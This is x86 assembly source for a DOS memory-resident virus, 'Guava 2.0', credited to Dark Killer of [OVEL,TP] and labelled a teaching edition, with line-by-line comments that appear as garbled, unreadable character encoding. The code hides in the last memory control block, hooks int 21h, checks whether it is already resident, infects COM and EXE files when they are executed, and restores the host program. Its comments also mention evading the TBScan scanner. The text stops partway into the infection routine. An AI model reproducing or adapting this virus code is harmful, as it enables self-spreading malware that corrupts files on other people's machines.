

        OvelOvelOvelOvelOvelOvelOvelOvelOvelOvelOvelOvelOvelOvelOvelOvel
        v                                                              v
        e       »OÆW«Â¤O¯f¬r¬ã¨s²ÕÂ´ ²Ä ‘D ´Á Âø»x      P.005          e
        l       [¯f¬r]                                                 l
        O                                                              O
        v       Guava 2.0 (±Ð¾Çª©)                      Dark Killer    v
        e       E-Mail: None                                           e
        l                                                              l
        OvelOvelOvelOvelOvelOvelOvelOvelOvelOvelOvelOvelOvelOvelOvelOvel

;
; ¡¼ ¯f¬r¦WºÙ
;    Guava 2.0 (±Ð¾Çª©)
;
; ¡¼ ¯f¬r§@ªÌ
;    Dark Killer of [OVEL,TP]
;
; ¡¼ ¯f¬r¯S©Ê¡G
;
;    * ¡u­«©w¦ì¡v¤Î¡u§PÂ_©Ò­n·P¬VªºÀÉ®×¬O COM ©Î EXE¡v¸úÁ× TBScan
;    * ±`¾n¦b³Ì«á¤@­Ó MCB¡A¦³ UMB ·|¦Û°Ê LoadHigh
;
; ¡¼ ª`·N¨Æ¶µ
;
;    - ½Ð¨Ï¥Î TASM/TLINK ½sÄ¶¡C
;
                .286c                           ; §Ú­Ì¨Ï¥Î 286 «ü¥O¡A©Ò¥H­n§i¶D
                                                ; tasm: ³o°¦¬r¥Î¨ìªºµ{¦¡½X¦³
                                                ; 286 ¤~¯à¥Îªº«ü¥O¡A¦Ó "c" ¦³¥[
                                                ; µ¥©ó¨S¥[¡A­Ó¤Hªº²ßºD¡C

                .model  tiny                    ; §i¶D tasm ­n¥Î com ¼Ò¦¡¡C¦Ó
                                                ; com ¼Ò¦¡´N¬O¥Î .model tiny ¨Ó
                                                ; §i¶D tasm¡C

                .code                           ; §i¶D tasm µ{¦¡±q³o¸Ì¶}©l¡C

                org     0                       ; §âÀÉ®×ªº°¾²¾³]¬° 0¡A¬JµMÀÉ®×
                                                ; ªº°¾²¾¬° 0¡A¦Ó com ÀÉªº°¾²¾¤S
                                                ; ¬O 100h¡A«ç»ò·|³o¼Ë©O? ¦]¬°¯f
                                                ; ¬r¬O¤@ºØ¯S®íªº¡uµ{¦¡¡v¡A¥L·|
                                                ; ¥Î¨ì¤@¨Ç«Ü¯S®íªº¤èªk¡A¹³¤@¯ë
                                                ; ±`¾n®É¡A³£¥Î mov ah,31h µM«á
                                                ; ¦A¥Î int 21h¡A¦ý¬O³o­Ó¤èªkªº
                                                ; ¯ÊÂI´N¬O¥Î mem/c ´N·|³Qµo²{¦³
                                                ; ¯f¬rªº¦s¦b¡A©Ò¥H²{¦bªº¬r³£¬O
                                                ; ·Q¿ìªkÁ×§K¥Î³o­Ó¤èªk¡A¦Óª½±µ
                                                ; §ä¤@¶ô¥i¥H©ñ¯f¬rªº°O¾ÐÅé¡A¦Ó
                                                ; §Ú­Ì§äªº°O¾ÐÅé´N­è¦n¬O±q
                                                ; [0000h] ¶}©l©ñ¸m¡A¨Ï±o¡u°O¾Ð
                                                ; Åé¤¤ªº°¾²¾¬O "0"¡A¦Ó¤U­±ªº°¾
                                                ; ²¾¬O¡uÀÉ®×¤¤ªº°¾²¾¡v(¤]´N¬OÁÙ
                                                ; ¨S¨ì°O¾ÐÅé¤¤®É©Ò¥Îªº°¾²¾)¡A¬O
                                                ; ¤£¤@¼Ëªº¡C

start:
                cld                             ; ³]¤è¦VºX¼Ð¬° 0¡A·í¤è¦VºX¼Ð¬°
                                                ; 0 ®É¡A¨Ï¥Î movs?¡Bcmps? ¤Î
                                                ; stos? ³£·|¡u¶¶¦V¡v¡A§Y si¡Bdi
                                                ; ·|¼W¥[ (¦pªG "?" ¤º¬O b [¥Nªí
                                                ; byte] «h¼W¥[ 1¡A¦pªG¬O w [¥N
                                                ; ªí word] «h¼W¥[ 2¡A­Y¬O d [¥N
                                                ; ªí dword¡A¤]´N¬O double word]
                                                ; «h¼W¥[ 4)¡A¦pªG¤è¦VºX¼Ð¬O 1¡A
                                                ; «h si¡Bdi ·|´î¤Ö¡A¤]´N¬O¡u°f
                                                ; ¦V¡v¡A´î¤Öªº¤j¤p»P¤è¦VºX¼Ð¬°
                                                ; 0 ®É¬O¤@¼Ëªº¡C

                db      0beh                    ; ³]©wÀÉ®×¤¤ªº°¾²¾¡A³o¦æªº«ü¥O
file_offset     dw      0100h                   ; ´N¬O mov si,???? (???? ¤º©w­È
                                                ; §Ú­Ì³]¬° 100h¡A¦]¬°§Ú­Ì¬O¦b
                                                ; com ÀÉ¤º³Q°_°Êªº) («e­±¤£¬O¦³
                                                ; »¡¹L .model tiny ¶Ü? "tiny"
                                                ; ´N¬O­n§i¶D tasm ³o¬O .com ÀÉ)

                push    es                      ; §â es «O¯d (­Y·P¬V¤F¤@­Ó exe
                                                ; «á¦A°õ¦æ³o­Ó .exe ÀÉ®É¡A cs
                                                ; ·|µ¥©ó ss (¦]¬°¯f¬r³]©w¦¨³o¼Ë
                                                ; ¦ý¬O ds¡Bes ¤£·|µ¥©ó cs¡Bss (
                                                ; dos ³W©w ds=es=psp)¡A¬JµM ds
                                                ; »P es ¬Ûµ¥¡A¨º»ò¥u»Ý«O¯d¤@¥÷
                                                ; ¤U¨Ó§Y¥i¡A¥H«Kµ¥¤@¤U­n§â ds¡B
                                                ; es «ì´_­ìª¬¡C

                push    si                      ; «O¯dÀÉ®×ªº°¾²¾­È (¦]¬°¤U­±·|
                                                ; §ïÅÜ si¡A¦Ó si ¤º©ñµÛÀÉ®×ªº°¾
                                                ; ²¾­È)

                mov     ax,48feh                ; ·í ah=48h ®Éªº·N«ä¬O¸ò dos ­n
                mov     bh,al                   ; bx para ¤j¤pªº°O¾ÐÅé (1 ­Ó
                int     21h                     ; para µ¥©ó 16 ­Ó bytes¡A¥u¬O¥Î
                                                ; ªº³æ¦ì¤£¦P¡A³y¦¨¼Æ¦r¬Ý°_¨Ó¤£
                                                ; ¦P¡A¨Æ¹ê¤W³£¬O¬Û¦Pªº)

                jnc     run_host                ; ·í ah=48h ®É¡Abx µ¥©ó¸ò dos
                                                ; ­nªº para ¼Æ¥Ø¡A¦Ó bh=al=0feh
                                                ; ´N¬O¸ò dos ­n 0fe??h ªº para
                                                ; ¼Æ¥Ø¡A¦Ó 0fe??h para ´Nµ¥©ó¬O
                                                ; 0fe??0h bytes ¤j¬ù¬O 635Kb¡A
                                                ; dos ·íµM¨S¦³¿ìªkªÅ¥X¨º»ò¤jªº
                                                ; °O¾ÐÅéÅo¡A¨º´N¦^¶Ç¦^ "¿ù»~"
                                                ; ¡A"¿ù»~" «ç»ò¶Ç©O? ´N¥Î C ºX
                                                ; ¼Ð¡A·í C ºX¼Ð³] "0" ®É (ªí¥Ü
                                                ; °O¾ÐÅé¤¤ªº¬r§â C ºX¼Ð°Ê¹L¤â¸}
                                                ; ¡A¬JµM°O¾ÐÅé¤¤¦³¬r¡A¦ó¥²¦A©ñ
                                                ; ¤@¥÷¬r¦b°O¾ÐÅé¤W©O? ´N¤£¥Î¦A
                                                ; ¡u¦w¸Ë¡v¤@¦¸¤F¡A´N·Ç³Æ­n°õ¦æ
                                                ; ­ìµ{¦¡¤F¡C

install:                                        ; ³oÃä¬O¡u¦w¸Ë¡v¯f¬rªºµ{¦¡½X¡C

                mov     ax,ds                   ; °õ¦æ¨ì³o®É¡Ads = psp (¤£½×³o
                                                ; °¦¬r¬O¦b com ©Î¬O exe ¤º°õ¦æ
                                                ; ¦Ó³Q°_°Êªº¡Ads¡Bes ³£·|«ü¦V
                                                ; psp)¡AµM«á§â ax ¤]«ü¦V psp¡A
                                                ; ·Ç³Æ¤U­Ó°Ê§@¡C

                dec     ax                      ; ¨C¤@¶ô°O¾ÐÅé³£·|°t¸m¤@¤p¬q°O
                                                ; ¾ÐÅé¡A¨Ó»¡©ú¥L©ÒºÞ²zªº°O¾ÐÅé
                                                ; ªº¤j¤p¡B¦ì¸m¡A¦Ó¦]¬°°O¾ÐÅé¬O
                                                ; ¤@¶ô¤@¶ô³sµÛ©ñ (¨C¤@¶ô³£¾a¦b
                                                ; ¤@°_ªº)¡A©Ò¥H§Ú­Ì¥i¥Hºâ¥X³o¤@
                                                ; ¶ôªº¤j¤p¡AµM«á¦Aºâ¥X¤U¤@¶ôªº
                                                ; ¦ì¸m¡Aª¾¹D¤U¤@¶ôªº¦ì¸m«á¡A¤S
                                                ; ¥i¥H¥Î¦P¼Ëªº¤èªk (¦]¬°¤U¤@¶ô
                                                ; ¤]¦³°O¿ýµÛ¥LºÞªº°O¾ÐÅé¦³¦h¤j)
                                                ; ¨Óºâ¥X¤U¤U¤@¶ô¡A¤@ª½ºâ¨ì³Ì«á
                                                ; ¡A´N¬O³Ì«á¤@¶ô¡C¬°¦ó­nºâ³Ì«á
                                                ; ¤@¶ô©O? ¦]¬°³Ì«á¤@¶ô¡u³q±`¡v
                                                ; ¬O free (¥¼³Q¨Ï¥Îªº)¡A¥i¥H§â
                                                ; ¯f¬r©ñ¦b¨ºÃä¡C¦Ó¦b¨C¤@¶ô°O¾Ð
                                                ; Åéªº«e­± (¤£¬O¦b³o§Ö°O¾ÐÅé¤º)
                                                ; ´N¬O§Ú­Ì­è­è©ÒÁ¿ªº¡A¸Ì­±¦³³o
                                                ; ¶ô°O¾ÐÅéªº¤j¤p¡B¦ì¸mµ¥µ¥ªº¸ê
                                                ; ®Æ¡C
                                                ; ps: ³o¶ô¸ê®Æ°Ï§Ú­Ì´N¥s§@ MCB
                                                ; (Memory Control Block¡A°O¾ÐÅé
                                                ; ±±¨î°Ï¶ô¡A¤]´N¬O¥i¥H§Q¥Î³o¶ô
                                                ; ¸ê®Æ°Ï±±¨î¾ã»O¹q¸£°O¾ÐÅéªº°t
                                                ; ¸m¡A±±¸m¤£¦n´N·Ç³Æ«ö¤U Reset
                                                ; Åo)

                xor     di,di                   ; ¯f¬r¼g§@¤W³£­n¨D¤p¦Óºë®«¡A¦Ó
                                                ; xor di,di ªº¥Øªº·|§â di ÅÜ 0
                                                ; (·|§ïÅÜºX¼Ð!! ¦ý¬O¦b§Ú­Ì³o¸Ì
                                                ; ¤£·|¼vÅT¨ì³o°¦¬rªº¹B§@)¡A¦Ó
                                                ; mov di,0 ·|¥Î±¼ 3 ­Ó bytes¡A
                                                ; xor di,di ¥u¦³ 2 ­Ó bytes¡A©Ò
                                                ; ¥H§Ú­Ì³q±`³£¥Î xor di,di¡C

loop1:                                          ; ³o¬O¤@­Ó¼Ð°O¡Aµ¹°j°é¥Îªº¡C(°j
                                                ; °é¤£¤@©w­n¥Î loop ¨t¦Cªº«ü¥O
                                                ; ¡A¥u­n¦³¡u§Q¥Î¤@¬qµ{¦¡½X¤£Â_
                                                ; ªº§@¬Y¨Æ¡v´Nºâ¬O°j°é¤F¡C

                mov     ds,ax                   ; ­è­è§â ax ´î¤@¡AµM«á²{¦b­n§â
                                                ; ³o­Ó´î¤@ªº­È©ñ¨ì ds ¤º¡Aµ¥¤@
                                                ; ¤U¤~¤è«K¨Ï¥Î¡A¦Ó ds ¤ºªº­È´N
                                                ; ¬O«ü¦V MCB (°O¾ÐÅé±±¨î°Ï¶ô)

                cmp     byte ptr [di],'M'       ; °O¾ÐÅé±±¨î°Ï¶ôªº²Ä¤@­Ó byte
                je      con1                    ; ¬O»¡©ú¥¦©Ò±±¨îªº°O¾ÐÅé¬O³Ì«á
                cmp     byte ptr [di],'Z'       ; ¤@­Ó (¦pªG¬O³Ì«á¤@­Ó¡A³o¸Ì·|
                jne     con2                    ; ©ñ "Z")¡AÁÙ¬O¤£¬O³Ì«á¤@­Ó (¦p
                                                ; ªG¤£¬O³Ì«á¤@­Ó¡A³o¸Ì·|©ñ "M")
                                                ; ¦pªG¨â­Ó³£¤£¬O (¥Nªí¥H¸g¡u¶W
                                                ; ¹L¡v¤F¡A´N­n¸õ¦^¨Ó­ì¨Óªº°O¾Ð
                                                ; Åé°Ï¶ô (³o¤~¬O³Ì«á¤@­Ó°O¾ÐÅé
                                                ; °Ï¶ô)¡AµM«á¸õ¨ì con2 ªº¦a¤è¥h
                                                ; °t¸mÅý¯f¬rÂÃ¨­ªº°O¾ÐÅé¡C
con1:
                mov     bx,ax                   ; ¥ý§â ax ¤ºªº­È«O¯d¡A©È¡u¶W¹L
                                                ; ¡v¡A©Ò¥H¥ý§â²{¦bªº MCB ¦ì¸m¯d
                                                ; °_¨Ó¡A¦pªGµ¥¤U¡u¶W¹L¡v¡A³o¸Ì
                                                ; ¦]¬°¦³«O¯d°_¨Ó (¤]¥i¥Hºâ¬O¡u
                                                ; ³Æ¥÷¡v°_¨Ó)¡A´N¥i¥Hª½±µ®³¨Ó¥Î
                                                ; ¤F¡C

                inc     ax                      ; ·í§Aª¾¹D³o­Ó MCB ªº¦ì¸m«á¡A§â
                add     ax,word ptr [di+3]      ; MCB ¥[¤@¦A¥[¤W³o­Ó MCB ©Ò±±¨î
                                                ; ªº¤j¤p´NÅÜ¦¨¤F¤U¤@­Ó MCB ªº¦ì
                                                ; ¸m¤F¡A¦Ó³o­Ó MCB ªº¤j¤p´N¬O¦b
                                                ; MCB ¶}ÀY©¹¤U 3 bytes¡A¦Ó­è­è
                                                ; ¤£¬O§â di ÅÜ 0 ¶Ü? (¥Î xor «ü
                                                ; ¥Oªº¨º¤@¦æ)¡A³o®É­ÔÅÜ¦¨ 0+3=3
                                                ; ¡A´N«ü¦V DS:[0003h] ªº¦ì¸m¤F
                                                ; ¡A¤]³\¦³¤H·|°Ý¡A¬°¦ó¤£ª½±µ¥Î
                                                ; [0003h] ©O? ¦P¼Ëªº¹D²z¡A¦]¬°
                                                ; [di+3] ªº«ü¥O¤ñ¸û¤p¡C

                jmp     loop1                   ; ©¹¦^¸õ¡A§Î¦¨°j°é¡C

con2:                                           ; ·í§ä¨ì³Ì«á¤@¶ô MCB ®É«K·|¸õ¨Ó
                                                ; ³o¸Ì¡C

                mov     ds,bx                   ; ·í§ä¨ì³Ì«á¤@¶ô MCB «á¡Abx ¤@
                                                ; ©w·|«O¦sµÛ³Ì«á¤@¶ô MCB ªº­È
                                                ; (³o­Ó­È¬O¡u¸`°Ï­È¡v)

                mov     ax,word ptr [di+3]      ; ³o¦æ¬O§â³Ì«á¤@­Ó MCB ªº¤j¤p§ä
                                                ; ¥X¨Ó¡C

                sub     ax,vir_para             ; µM«á´î±¼¯f¬r¤j¤p (vir_para)¡A
                jc      run_host                ; ¦pªG·¸¦ì (­É¦ì)¡A¥Nªí³o¶ô°O¾Ð
                                                ; Åéªº¤j¤p¤£°÷¯f¬rÂÃ¨­¡A¨º´N©ñ
                                                ; ±óÂÃ¨­¡C¬°¦ó·¸¦ì (­É¦ì) ´N¥N
                                                ; ªí³o¶ô°O¾ÐÅé¤£°÷¤j©O? ³o¬O¦]
                                                ; ¦ì¦pªG¦³­É¦ì (³o¸Ì·¸¦ìµ¥©ó­É
                                                ; ¦ì)¡A´N¬O»¡ ax < vir_para¡A³y
                                                ; ¦¨ ax ´î¥h¯f¬rªø«×®É¤£°÷´î¡A
                                                ; ¦Ó­É¦ì¡A­É¦ì®É C ºX¼Ð·|ÅÜ "1"
                                                ; ¦pªG C ºX¼ÐÅÜ¦¨ "1" ¨º´Nªí¥Ü
                                                ; ­É¦ì (·¸¦ì) ¤F¡A¤]¥i¥H»¡¦¨
                                                ; ax < vir_para¡A¬JµM³o¶ô°O¾ÐÅé
                                                ; ¤£°÷¤j¡A¨º´N¥u¦n©ñ±ó¤F¡C

                mov     word ptr [di+3],ax      ; §â³o§Ö©ÒºÞ²zªº°O¾ÐÅéªÅ¶¡´î¤p
                                                ; ¡A¨Ï±o¦³¤@¶ôªÅ¥X¨Ó¡A¦Ó¥¦«oºÞ
                                                ; ¤£¨ì¡AµM«á¯f¬r´N¥i¥HÂÃ¦b¨º¶ô
                                                ; ºÞ¤£¨ìªº¦a¤è¡C¼K! ¼K! ¼K!

                add     ax,bx                   ; bx ¨ì²{¦bÁÙ¨S¦³°Ê¹L (¸Ì­±«O¯d
                inc     ax                      ; µÛ³o¶ô MCB ªº­È)¡AµM«á­nºâ¥X
                                                ; ¨º¶ôºÞ¤£¨ìªº°O¾ÐÅé (¤T¤£ºÞ¦a
                                                ; ±a?!)¡AµM«á¤~¯à§â¯f¬rµ¹·h¹L¥h
                                                ; ¦í¡C

                mov     es,ax                   ; ax ­è­è´Nºâ¦n¤F¡A³o®Éªº ax «ü
                                                ; ¦V¡u¤T¤£ºÞ¦a±a¡v¡AµM«á§â es
                                                ; «ü¦V¸Ó°Ï¡A·Ç³Æ·h²¾¡C¬°¦ó¤£¥Î
                                                ; ds ©O? ¦]¬°¡urep movsb¡v³o¹D
                                                ; «ü¥O¹ï©ó·h²¾«Ü¤è«K¡A¦Ó rep
                                                ; movsb ¦³³W©w¤@©w­n¥Ñ ds:si ·h
                                                ; ©¹ es:di ·h cx ­Ó bytes¡A©Ò¥H
                                                ; ´N­n©ñ¦b es Åo (es:di ¬°¡u¥Ø
                                                ; ªº¦a¡v)¡A¦Ó¦¹®Éªº di ¬° 0¡A¤]
                                                ; ´N¬O­è­è¥Î xor di,di ªºµ²ªG¡C
                                                ; ©Ò¥H³oÃä´N¤£¥Î¦A³]©w di ¬° 0
                                                ; ¤F¡C¤@­Óµ{¦¡½X­n¦Ò¼{«Ü¦h¡A¤~
                                                ; ¯à°÷¼g¥X³Ì¤pªº¯f¬r¡A¹³ Cute
                                                ; (DS ¼gªº) ´N¬OÅo¡C

                push    cs                      ; ¦]¬°·Ç³Æ­n§â ds:si ªºªF¦è·h¨ì
                pop     ds                      ; es:di ¥h¡A¦Ó¬O§â¯f¬r·h¹L¥h¡A
                                                ; ¯f¬r¦b¨º©O¡A´N¦b¡ucs:°¾²¾¡vªº
                                                ; ¦a¤è¡A³o­Ó°¾²¾¬OÀÉ®×ªº°¾²¾¡A
                                                ; ¦Ó°¾²¾­è­è´N¬O©ñ¦b si¡A©Ò¥H
                                                ; ds:si ´N­è­è¦n«ü¦V¯f¬r¶}ÀYÅo
                                                ; ¡C

                mov     cx,vir_size             ; ³]©w­n·h¦h¤j¡A¦]¬°§Ú­Ì­n§â¯f
                                                ; ¬r¾ã°¦·h¹L¥h¡A©Ò¥H³]¬°¯f¬rªº
                                                ; ¤j¤p (§Y vir_size)¡C

                rep     movsb                   ; §â¯f¬r¥DÅé·h¹L¥h¡C

                xor     si,si                   ; ¥ý§â si ÅÜ¬° 0

                mov     ds,si                   ; §â ds ¤]ÅÜ¬° 0 (­è­èªº si ¤£
                                                ; ¬OÅÜ 0 ¤F¶Ü?) ¡A·Ç³Æ§ï¤¤Â_¦V
                                                ; ¶qªí¤¤ªº int 21h¡C

                mov     ax,offset newint21h     ; ±N ax ©ñ¸m§Ú­Ìªº int 21h °¾²¾

                xchg    word ptr [si+180h],ax   ; ±N ax »P­ì¨Óªº int 21h °¾²¾¹ï
                                                ; ½Õ¡A¦¹®É¡A¦]¬° si ¬° 0¡A©Ò¥H
                                                ; ¥¦«ü¦Vªº¬O 0000h:0084h¡A¤]´N
                                                ; ¬O°O¿ýµÛ int 21h ªº¦ì¸m¤§³B¡C
                                                ; ¦Ó³o¹D«ü¥O°õ¦æ§¹«á¡Aax ¬°­ì
                                                ; int 21h ªº°¾²¾¡A¦Ó°O¾ÐÅé¤¤¬°
                                                ; §Ú­Ìªº int 21h (newint21h) ªº
                                                ; °¾²¾¡C

                mov     word ptr es:oldint21h,ax; µM«á§â­ì¨Óªº int 21h °¾²¾©ñ¤J
                mov     word ptr es:entint21h,ax; oldint21h ¤Î entint21h¡C

                mov     ax,es                   ; §â§Ú­Ìªº int 21h ¸`°Ï¦ì¸m©ñ¨ì
                                                ; ax ¥h¡C

                xchg    word ptr [si+182h],ax   ; ±N ax »P­ì¨Óªº int 21h ¥æ´«¡C
                                                ; ¨Ï±o ax ¬°­ì¨Ó int 21h ªº¸`°Ï
                                                ; ­È¡C

                mov     word ptr es:oldint21h+2,ax; §â­ì int21h ªº¸`°Ï­È©ñ¤J
                mov     word ptr es:entint21h+2,ax; oldint21h ¤Î entint21h

run_host:                                       ; ³oÃä´N¬O·Ç³Æ°õ¦æ­ìÀÉ®×ªºµ{¦¡
                                                ; ¤ùÂ_¤F¡C

                pop     si                      ; §â°¾²¾®³¦^¨Ó («Ü«e­±¤£¬O¦³¥Î
                                                ; push si «O¯d¶Ü?)

                pop     es                      ; §â psp ¸`°Ï­È®³¦^¨Ó

                push    cs                      ; Åý cs=ds
                pop     ds

                cmp     sp,0a000h               ; ¦pªG¬O±q .com ÀÉ°_°Ê¡Asp À³¸Ó
                jb      run_exe                 ; ·|µ¥©ó 0fffeh¡A¦ý¬O¦pªG¬O±q
                                                ; exe ÀÉ°_°Ê¡Asp «h·|³]¦b 8xxxh
                                                ; ¥ª¥k¡C­Y¦¹®É sp ¤p©ó 0a000h¡A
                                                ; ¥Nªí¯f¬r¬O±q exe ÀÉ°_°Êªº¡A´N
                                                ; ¸õ¨ì«ì´_ exe ÀÉªº¤ùÂ_¡C

run_com:                                        ; ³o¸Ì¬O«ì´_ com ±M¥Îªºµ{¦¡¡C

                add     si,offset head_1        ; ³o¦æ¨ä¹ê¥»¨Ó¬O
                                                ; lea si,[si+offset head_1]
                                                ; ¦]¬°­n¬Ùµ{¦¡½X¡A©Ò¥H¥Î add «ü
                                                ; ¥O§Y¥i¡C¦Ó head_1 ©ñªº´N¬O­ì
                                                ; ÀÉ®×ªºÀÉÀY¡C

                mov     di,100h                 ; ¦]¬°µ¥¤@¤U­n¥Î¨ì movsw¡Bmovsb
                                                ; ©Ò¥H­n§â es:di ³]¦bÀÉÀY¡A§â­ì
                                                ; ÀÉÀY«ì´_¡C

                movsw                           ; §A¤]³\·|Ä±±o«Ü©_©Ç¡A¬°¦ó³o¸Ì
                movsb                           ; ¬O¥Î movsw¡Bmovsb ¨Ó·h¡A¦Ó¤£
                                                ; ¬O¥Î rep movsb ¨Ó·h©O? ¦]¬°¥Î
                                                ; rep movsb ÁÙ­n³]©w mov cx,3¡A
                                                ; ´N¦Y±¼ 3 ­Ó bytes¡A¦pªG¦A¥[¤W
                                                ; rep movsb ªº 2 ­Ó bytes¡A´N 5
                                                ; ­Ó bytes ¤F¡A¦pªG¥Î movsw ¤Î
                                                ; movsb ªº¸Ü¡A¥u³Ñ¤U 2 bytes¡A
                                                ; µ{¦¡½X·íµM¬O·U¤p·U¦n¡C

                sub     di,3                    ; ³o®Éªº di ¤w¸gÅÜ¦¨ 103h¡A¦A´î
                                                ; ±¼ 3 ´NÅÜ¦¨ 100h¡A´N¥i¥H°õ¦æ
                                                ; ­ìÀÉ®×¤F¡C

                jmp     di                      ; ¬°¦ó¤£ª½±µ¥Î jmp 0100h ©O? ¦]
                                                ; ¬° jmp ???? (¨ä¤¤ ???? ¬O¼Æ¦r
                                                ; ) ¬O¥H©¹«á¸õ n ­Ó bytes ©Î©¹
                                                ; «e¸õ n ­Ó bytes¡AÄÝ©ó¡u¬Û¹ï©Ê
                                                ; ¡v¡A¦Ó¤£¬Oµ´¹ï©Ê¡C
run_exe:
                mov     cx,es                   ; ¦¹®Éªº es ¬O«ü¦V psp ªº­È (­è
                add     cx,10h                  ; ­è¤£¬O pop es)¡A²{¦b§â es ªº
                                                ; ­È©ñ¤J cx¡AµM«á¦A¥[ 10h (psp
                                                ; ªº¤j¤p)

                add     si,offset head_1+0eh    ; ³o¦æ¬Û·í©ó¤U­±³o¤@¦æ¡G
                                                ; lea si,[si+offset head_1+0eh]
                                                ; ¦ý¬O­n¬Ùµ{¦¡½X¡A´Nª½±µ¥[Åo¡A
                                                ; ¦Ü©ó¬°¦ó­n¦A¥[ 0eh¡A¬O¦]¬°¥[
                                                ; ¤F 0eh «á¥i¥Hª½±µ¥Î lodsw Åª
                                                ; ¨ì ss:sp ªº­È¡C(·íµM¤£¬O¥uÅª
                                                ; ¤@¦¸Åo¡Ass ¤Î sp ¦U­nÅª¤@¦¸¡A
                                                ; ¤U­±´N­nÅª ss¡Bsp Åo)

                lodsw                           ; ³o¸ÌÅª¶i¨Ó ss ªº¡u°_©l­È¡v¡A
                                                ; ©Ò¥H§Ú­Ì­n§ï¦¨¯u¥¿ªº ss ­È¡C

                add     ax,cx                   ; ­è­è»¡¹L cx=psp ¦A¥[ 10h¡A©Ò
                                                ; ax °õ¦æ³o¹D«ü¥O«á´NÅÜ¦¨¯u¥¿ªº
                                                ; ss ­È¡Cps: ¯u¥¿ªº ss ­Èµ¥©óÀÉ
                                                ; ÀYªº ss ­È¥[ psp ¸`°Ï¦ì¸m¦A¥[
                                                ; 10h

                xchg    bx,ax                   ; §â¯u¥¿ªº ss ­È´«¨ì bx ¥h¡A¬°
                                                ; ¦ó¤£¥Î xchg bx,ax ©O? ³o¬O¦]
                                                ; ¬° xchg bx,ax ¥u¦³ 1 byte¡A¦Ó
                                                ; mov bx,ax ­n 2 bytes¡A¡u¬Ùµ{
                                                ; ¦¡½X¡v¬O§Ú­Ìªº¼g¬rªº²ßºD¤§¤@

                lodsw                           ; ³o®ÉÅª¤Jªº´NÅÜ¦¨ sp¡Asp ¤ñ¸û
                                                ; Â²³æ¡A¤£¥Î¦A´«¡Aª½±µ´N¥i¥H¥Î

                mov     ss,bx                   ; §â­ìµ{¦¡ªº°ïºÐ§ï¦^¥h (¦¹®Éªº
                mov     sp,ax                   ; bx ¬O ss¡Aax ¬O sp)

                lodsw                           ; §â si ¥[ 2¡A¦]¬°³o­Ó word §Ú
                                                ; ­Ì¨S¦³¥Î¨ì¡C¬°¦ó¤£¥Î inc si¡B
                                                ; inc si ©O? ¦]¬°­n¡u¬Ùµ{¦¡½X¡v
                                                ; lodsw ¥u¦³ 1 byte¡A¦Ó inc si
                                                ; ¡Binc si ­n 2 bytes¡A¦ý¬O­nª`
                                                ; ·N¡A¦¹®Éªº D ºX¼Ð (¤è¦VºX¼Ð)
                                                ; ­n³]©w¦n¡A§_«h¤Ï¦Ó·|³y¦¨
                                                ; dec si¡Bdec si ªº®ÄªG¡C

                lodsw                           ; ³o®É­ÔÅª¤Jªº¬O ip ­È (¤£¥Î§ï)

                xchg    bx,ax                   ; §â ip ªº­È©ñ¨ì bx

                lodsw                           ; ¦¹®ÉÅª¤Jªº¬O¡u°_©l­È¡vªº cs¡A
                add     ax,cx                   ; »Ý­n³B²z¡A¤èªk¸ò ss ¤@¼Ë¡A¥[
                                                ; psp ªº­È¤Î 10h

                push    ax                      ; ³o­Ó ax ¬O cs¡A¦Ó bx ¬O ip¡A
                push    bx                      ; §â¥L­Ì±À¤J°ïºÐ¡A·Ç³Æ¸õ¦^­ìµ{
                                                ; ¦¡

                push    es                      ; §O§Ñ¤F²{¦b¥u¦³ es ¬O«ü¦V psp
                pop     ds                      ; ¡A©Ò¥H­n§â ds ¤@°_«ü¦V psp¡C

                retf                            ; ªð¦^­ìµ{¦¡ (­è­è¤£¬O¦³ push
                                                ; ¤F cs¡Bip ?)

head_1          db      0cdh,20h                ; ¬°¦ó­n¥Î 0cdh,20h ©O? ³o¬O¦]
                db      16h dup(?)              ; ¬°²Ä¤@¦¸°õ¦æ®É­nÅý­ìµ{¦¡¥¿±`
                                                ; µ²§ô¡A©Ò¥H´N¥Î¤F 0cdh,20h ³o
                                                ; ­Ó«ü¥O (cdh,20h §Y int 20h ªº
                                                ; µ{¦¡½X)

msg             db      '[Guava 2.0] by Dark Killer of [OVEL,TP]',0
                                                ; ³o­Ó´N¤£»Ý­nÁ¿§a¡AGuava 2.0
                                                ; ±Ð¾Çª©ªº°T®§¡C

newint21h:                                      ; §Ú­Ìªº int 21h ªA°Èµ{¦¡¡C

                pushf                           ; ¥ý«O¯d­ì¨ÓªººX¼Ð¡A¦]¬°µ¥¤@¤U
                                                ; ­n¥Î¨ì cmp «ü¥O¡A¦Ó cmp «ü¥O
                                                ; ·|¤zÂZ¨ì­ì¨ÓªººX¼Ð¡A©Ò¥H§Ú­Ì
                                                ; ­n¥ý«O¯d¡C

                cmp     ah,4bh                  ; ¦pªG ah=4bh ®É¡A¥Nªí¥L­n°õ¦æ
                je      infect                  ; ÀÉ®×¡A´N¶X¾÷·P¬V¡C

                cmp     ax,48feh                ; ¦pªG¬O¦Û¤vªº¬r­n¬Ý¬Ý¯f¬r¬O¤£
                jne     newint21h_exit          ; ¦b°O¾ÐÅé¤¤¡A¦pªG¬O¡A´N­nµ¹¥L
                cmp     bh,al                   ; ¤@­Ó¦^À³¡AÅý¥Lª¾¹D¯f¬r¤w¸g±`
                jne     newint21h_exit          ; ¾n¤F¡C

                popf                            ; ³o¸Ì´N¬O½T©w¬O¯f¬r¦b©I¥s¡A´N
                iret                            ; ªð¦^ª½±µªð¦^¡C

newint21h_exit:                                 ; Â÷¶}§Ú­Ì¦Û¤vªº int 21h¡A¦^¨ì
                popf                            ; dos ªº int 21h
                jmp     dword ptr cs:oldint21h

infect:                                         ; ·P¬VÀÉ®×ªº°Æµ{¦¡¡C

                pusha                           ; ¥ý«O¯d©Ò¦³ªº¼È¦s¾¹¡C¨ä¤¤¸Ì­±
                push    ds                      ; ªº pusha ¬OÄÝ©ó 286 «ü¥O¡A¦b
                push    es                      ; PC/XT ªº¾÷¾¹¤W¬O¤£¯à¶]ªº¡C

                mov     ax,3d02h                ; ¦¹®É¦]¬° ah=4bh ®É ds:dx ­è¦n
                call    callint21h              ; ¬OÀÉ¦W¡A¨º§Ú­Ì´N¥i¥Hª½±µ¨Ï¥Î
                                                ; ax=3d02h (Åª¼g¼Ò¦¡) ª½µó¶}ÀÉ

                jnc     infect_con1             ; ¦pªG¨S¦³¿ù»~¡A´NÄ~Äò°õ¦æ¡C

                jmp     infect_exit0            ; ¦pªG¦³¿ù»~¡A´N¸õ¥X¡C
                                                ; ³o¸Ì¬°¦ó¤£¥Î jc ©O? ¦]¬° jc
